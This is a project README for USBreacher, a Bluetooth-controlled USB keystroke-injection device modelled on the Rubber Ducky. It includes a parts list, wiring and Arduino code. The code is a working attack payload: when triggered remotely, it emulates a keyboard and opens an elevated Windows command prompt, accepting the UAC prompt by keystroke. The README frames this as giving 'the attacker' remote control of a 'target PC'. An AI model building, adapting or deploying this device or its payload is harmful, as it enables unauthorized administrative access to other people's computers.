## USBreacher
USBreacher is an amateur open-source project developed by TITAN Security in 2021, inspired by the well-known USB Rubber Ducky.  
Rubber Ducky is a tool shaped like a USB flash drive that can send commands to the connected computer by emulating an input device (mouse, keyboard, gamepad, etc.).

The idea originated from the need to overcome some limitations of this product:  
▶ It can store only one script.  
▶ The script is executed immediately.  
▶ Remote commands cannot be issued.

USBreacher, on the other hand, retains all the functionalities of the original product while introducing some advantages.  
It features a Bluetooth/WiFi interface, allowing it to communicate with a remote device to issue commands remotely.  
This modification enables the attacker to choose when and which script to execute and to directly control the device (usually a keyboard) as needed.

**Technical specifications**
USBreacher is a free, open-source project, which means it can be built as desired. However, it was originally designed with the following technical specifications:
▶ Arduino Pro Micro development board with an ATmega 32U4 processor
▶ HC-05 wireless module
▶ Custom 3D-printed case

The device can also be replicated with components different from those specified above, as long as they are suitable for the purpose. Not all development boards can emulate an input device, and not all wireless modules support Bluetooth/WiFi technologies.

**Assembly**  
To replicate the project, it is recommended to follow this guide:  
▶ Gather the necessary components
▶ Connect the following pins via soldering, following this scheme:  
VCC → VCC  
GND → GND  
8 → RXD  
9 → TXD  
▶ Place the boards into the enclosure
▶ Program the development board according to your needs

The development board can be programmed using the official Arduino IDE.  
To configure the Bluetooth module, this video tutorial is helpful.

An example of the code can be downloaded below.

**Sofware**
```c++
#include <Keyboard.h>
#include <SoftwareSerial.h>

char ch = 0;
char deb = 0;
////////////////////////////////////////////////////////////////////////////////////////////
void del(int time){
  delay(time);
}
///////////////////////////////////////////////////////////////////////////////////////////
void p(int key)
{
  Keyboard.press(key);
  del(10);
  Keyboard.release(key);
}
SoftwareSerial SSerial(9,8);
//////////////////////////////////////////////////////////////////////////////////////////
void setup() {
  Serial.begin(9600);
  //while(!Serial) {}

  SSerial.begin(9600);
  Serial.println("Board initialized");
}
///////////////////////////////////////////////////////////////////////////////////////////
void cmd(){
  Keyboard.begin();
  del(500);
  p(KEY_LEFT_GUI);
  p('r');
  del(500);
  Keyboard.print("cmd");
  del(100);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  del(50);
  Keyboard.releaseAll();
  del(1000);
  p(KEY_LEFT_ARROW);
  del(50);
  p(KEY_RETURN);
  del(500);
  Keyboard.releaseAll();
}
/////////////////////////////////////////////////////////////////////////////////////////////////
void loop() {
  if (SSerial.available()){
    ch = SSerial.read();
  if (ch == 'd'){
  cmd();
  }



}}
```

**Usage**  
To use the device, simply connect it to the target PC and control it via a software application, which is also available for Android. The software settings should be calibrated based on the code loaded onto the board.
